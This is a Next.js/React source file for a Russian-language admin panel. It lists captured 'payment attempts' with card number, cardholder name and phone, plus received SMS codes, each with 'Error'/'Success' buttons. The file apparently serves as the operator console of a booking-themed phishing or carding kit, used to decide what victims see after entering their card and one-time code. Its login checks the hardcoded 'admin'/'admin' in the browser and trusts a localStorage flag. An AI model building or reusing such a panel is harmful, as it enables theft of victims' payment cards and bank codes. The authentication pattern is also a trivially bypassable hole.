'use client';

import { useState, useEffect } from 'react';
import { useRouter } from 'next/navigation';

interface Notification {
  id: string;
  type: 'payment' | 'sms_code' | 'booking';
  data: any;
  timestamp: string;
  status: 'pending' | 'error' | 'success';
}

export default function AdminPanel() {
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [notifications, setNotifications] = useState<Notification[]>([]);
  const router = useRouter();

  useEffect(() => {
    // Проверяем авторизацию при загрузке
    const auth = localStorage.getItem('admin_auth');
    if (auth === 'true') {
      setIsAuthenticated(true);
      fetchNotifications();
    }
  }, []);

  const fetchNotifications = async () => {
    try {
      const response = await fetch('/api/admin/notifications');
      const data = await response.json();
      if (data.ok) {
        setNotifications(data.notifications);
      }
    } catch (error) {
      console.error('Error fetching notifications:', error);
    }
  };

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    if (username === 'admin' && password === 'admin') {
      localStorage.setItem('admin_auth', 'true');
      setIsAuthenticated(true);
      fetchNotifications();
    } else {
      alert('Неверные учетные данные');
    }
  };

  const handleLogout = () => {
    localStorage.removeItem('admin_auth');
    setIsAuthenticated(false);
    router.push('/adminpanel');
  };

  const handleAction = async (notificationId: string, action: 'error' | 'success') => {
    try {
      const response = await fetch('/api/admin/action', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ notificationId, action })
      });
      const data = await response.json();
      if (data.ok) {
        // Обновляем статус уведомления
        setNotifications(prev => prev.map(n => 
          n.id === notificationId ? { ...n, status: action } : n
        ));
      }
    } catch (error) {
      console.error('Error handling action:', error);
    }
  };

  if (!isAuthenticated) {
    return (
      <div className="min-h-screen bg-gray-100 flex items-center justify-center">
        <div className="bg-white p-8 rounded-lg shadow-md w-96">
          <h1 className="text-2xl font-bold mb-6 text-center">Вход в админ-панель</h1>
          <form onSubmit={handleLogin} className="space-y-4">
            <div>
              <label className="block text-sm font-medium text-gray-700">Логин</label>
              <input
                type="text"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                className="mt-1 block w-full rounded-md border-gray-300 shadow-sm focus:border-blue-500 focus:ring-blue-500"
                required
              />
            </div>
            <div>
              <label className="block text-sm font-medium text-gray-700">Пароль</label>
              <input
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="mt-1 block w-full rounded-md border-gray-300 shadow-sm focus:border-blue-500 focus:ring-blue-500"
                required
              />
            </div>
            <button
              type="submit"
              className="w-full bg-blue-600 text-white py-2 px-4 rounded-md hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2"
            >
              Войти
            </button>
          </form>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-100">
      <div className="max-w-7xl mx-auto py-6 sm:px-6 lg:px-8">
        <div className="px-4 py-6 sm:px-0">
          <div className="flex justify-between items-center mb-6">
            <h1 className="text-3xl font-bold text-gray-900">Админ-панель</h1>
            <button
              onClick={handleLogout}
              className="bg-red-600 text-white py-2 px-4 rounded-md hover:bg-red-700 focus:outline-none focus:ring-2 focus:ring-red-500 focus:ring-offset-2"
            >
              Выйти
            </button>
          </div>
          
          <div className="bg-white shadow overflow-hidden sm:rounded-md">
            <ul className="divide-y divide-gray-200">
              {notifications.map((notification) => (
                <li key={notification.id} className="px-6 py-4">
                  <div className="flex items-center justify-between">
                    <div className="flex-1">
                      <div className="flex items-center">
                        <span className={`px-2 py-1 text-xs font-semibold rounded-full ${
                          notification.status === 'pending' ? 'bg-yellow-100 text-yellow-800' :
                          notification.status === 'error' ? 'bg-red-100 text-red-800' :
                          'bg-green-100 text-green-800'
                        }`}>
                          {notification.status === 'pending' ? 'Ожидает' :
                           notification.status === 'error' ? 'Ошибка' : 'Успех'}
                        </span>
                        <span className="ml-2 text-sm text-gray-500">
                          {new Date(notification.timestamp).toLocaleString()}
                        </span>
                      </div>
                      <div className="mt-2">
                        {notification.type === 'payment' && (
                          <div>
                            <p className="text-sm font-medium text-gray-900">Попытка оплаты</p>
                            <p className="text-sm text-gray-500">Карта: {notification.data.card}</p>
                            <p className="text-sm text-gray-500">ФИО: {notification.data.owner}</p>
                            <p className="text-sm text-gray-500">Телефон: {notification.data.phone}</p>
                          </div>
                        )}
                        {notification.type === 'sms_code' && (
                          <div>
                            <p className="text-sm font-medium text-gray-900">SMS-код</p>
                            <p className="text-sm text-gray-500">Код: {notification.data.code}</p>
                          </div>
                        )}
                        {notification.type === 'booking' && (
                          <div>
                            <p className="text-sm font-medium text-gray-900">Бронирование</p>
                            <p className="text-sm text-gray-500">Имя: {notification.data.firstName}</p>
                            <p className="text-sm text-gray-500">Фамилия: {notification.data.lastName}</p>
                          </div>
                        )}
                      </div>
                    </div>
                    {notification.status === 'pending' && (
                      <div className="ml-4 flex space-x-2">
                        <button
                          onClick={() => handleAction(notification.id, 'error')}
                          className="bg-red-600 text-white py-2 px-4 rounded-md hover:bg-red-700 focus:outline-none focus:ring-2 focus:ring-red-500 focus:ring-offset-2"
                        >
                          Ошибка
                        </button>
                        <button
                          onClick={() => handleAction(notification.id, 'success')}
                          className="bg-green-600 text-white py-2 px-4 rounded-md hover:bg-green-700 focus:outline-none focus:ring-2 focus:ring-green-500 focus:ring-offset-2"
                        >
                          Успех
                        </button>
                      </div>
                    )}
                  </div>
                </li>
              ))}
            </ul>
          </div>
        </div>
      </div>
    </div>
  );
} 